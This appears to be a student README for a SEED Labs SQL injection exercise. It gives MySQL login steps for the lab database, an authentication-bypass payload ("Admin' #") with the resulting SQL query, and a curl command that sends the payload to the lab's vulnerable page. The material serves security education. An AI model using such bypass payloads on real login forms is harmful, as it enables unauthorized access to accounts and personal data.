# SQL_INJECTION
###Task 1: 	Log in MYSQL:

	
  
    mysql -u root -pseedubuntu;
    
		mysql> use Users;
    
		mysql> show tables;
	
//Use such a SQL query:
		
    select * from credential where Name='Alice';



![alt text](https://github.com/RubiaQayoum/SQL_INJECTION/blob/main/task%201.png)
 
 
 ###Task 2: 
 -->Task 2.1
    
    .USERNAME: "Admin' #"
	  
    .PASSWORD: "xyz" (here is password is optional)


//We will result in SQL Query

		
    SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password 
    FROM credential WHERE name='Admin' #' && password='xyz'
 
 --> Task 2.2
    1- Write Code on Terminator in Seed Lab:
	 
    
    curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23';
	
  
    
    2- Copy the HTML code.
	  3- Make a new file in location "file:///home/seed/Documents/temp.html"
	  4- Run this location on browser
    
    
![alt text](https://github.com/RubiaQayoum/SQL_INJECTION/blob/main/task%202.1.png)


